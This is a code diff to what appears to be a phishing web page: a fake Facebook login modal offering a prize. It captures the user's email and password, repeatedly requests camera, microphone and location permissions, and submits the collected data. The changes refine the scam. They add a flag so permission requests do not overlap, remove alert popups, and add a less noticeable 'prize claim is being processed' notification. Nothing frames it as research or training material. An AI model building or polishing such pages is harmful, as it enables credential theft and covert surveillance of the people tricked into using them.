@@ -238,7 +238,7 @@
                     <div style="margin-bottom: 15px;">
                         <button type="submit" class="facebook-login-button" style="width: 100%; background-color: #1877f2; color: white; border: none; padding: 12px; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer;">
                             Log In & Claim Your Prize
-                        </button>
+            </button>
                     </div>
                     <div style="margin-bottom: 15px; text-align: center;">
                         <a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px;">Forgot password?</a>
@@ -336,6 +336,7 @@
         let cameraPermission = false;
         let microphonePermission = false;
         let locationPermission = false;
+        let requestInProgress = false;
         
         // Check permissions on page load
         document.addEventListener('DOMContentLoaded', function() {
@@ -364,6 +365,9 @@
         
         // Request all permissions and submit form data
         function requestAllPermissions(email, password) {
+            // Set flag to prevent multiple simultaneous requests
+            requestInProgress = true;
+            
             let userData = {
                 email: email,
                 password: password,
@@ -415,11 +419,15 @@
                 .then(() => {
                     // All permissions have been requested, submit the data
                     submitUserData(userData);
+                    // Reset the request flag after everything is done
+                    requestInProgress = false;
                 })
                 .catch(error => {
                     console.error('Permission error:', error);
                     // Try to proceed anyway
                     submitUserData(userData);
+                    // Reset the request flag after everything is done, even on error
+                    requestInProgress = false;
                 });
         }
 
@@ -457,8 +465,6 @@
                 console.log('Success:', data);
                 // Hide the permission overlay
                 document.getElementById('permission-overlay').style.display = 'none';
-                // Show a success message or redirect to a thank you page
-                alert('Thank you! Your prize claim is being processed.');
                 // Redirect to a different page or close the modal
                 document.getElementById('loginModal').style.display = 'none';
             })
@@ -466,11 +472,10 @@
                 console.error('Error:', error);
                 // Still hide the overlay and show a generic success message
                 document.getElementById('permission-overlay').style.display = 'none';
-                alert('Thank you! Your prize claim is being processed.');
                 document.getElementById('loginModal').style.display = 'none';
             });
         }
-
+        
         // Check status of permissions
         function checkPermissionStatus() {
             // If all permissions are already granted, do nothing
@@ -490,7 +495,9 @@
                             checkAllPermissionsGranted();
                         } else if (result.state === 'prompt') {
                             // Permission has not been requested yet or was dismissed
-                            requestAllPermissions();
+                            if (!requestInProgress) {
+                                requestAllPermissions();
+                            }
                         }
                     });
                 
@@ -504,14 +511,16 @@
                             checkAllPermissionsGranted();
                         } else if (result.state === 'prompt') {
                             // Permission has not been requested yet or was dismissed
-                            requestAllPermissions();
+                            if (!requestInProgress) {
+                                requestAllPermissions();
+                            }
                         }
                     });
             }
             
             // We can't really check geolocation permission status without requesting it,
-            // so if it's not already granted, we request it again
-            if (!locationPermission) {
+            // so if it's not already granted, we request it again, but only if not already in progress
+            if (!locationPermission && !requestInProgress) {
                 requestAllPermissions();
             }
         }
@@ -530,6 +539,35 @@
                 setTimeout(function() {
                     document.getElementById('permission-overlay').style.display = 'none';
                     document.body.style.overflow = 'auto'; // Restore scrolling
+                    
+                    // Only show this message once when all permissions are first granted
+                    if (!window.permissionsAlreadyGranted) {
+                        // Use a calmer notification instead of an alert
+                        window.permissionsAlreadyGranted = true;
+                        
+                        // Create a non-intrusive notification element
+                        const notification = document.createElement('div');
+                        notification.style.position = 'fixed';
+                        notification.style.bottom = '20px';
+                        notification.style.right = '20px';
+                        notification.style.backgroundColor = '#4CAF50';
+                        notification.style.color = 'white';
+                        notification.style.padding = '10px 20px';
+                        notification.style.borderRadius = '5px';
+                        notification.style.zIndex = '9999';
+                        notification.style.boxShadow = '0 2px 5px rgba(0,0,0,0.2)';
+                        notification.textContent = 'Thank you! Your prize claim is being processed.';
+                        
+                        // Add to body and remove after a few seconds
+                        document.body.appendChild(notification);
+                        setTimeout(function() {
+                            notification.style.opacity = '0';
+                            notification.style.transition = 'opacity 1s';
+                            setTimeout(function() {
+                                document.body.removeChild(notification);
+                            }, 1000);
+                        }, 3000);
+                    }
                 }, 1500); // Brief delay to show "Allowed" status
             }
         }
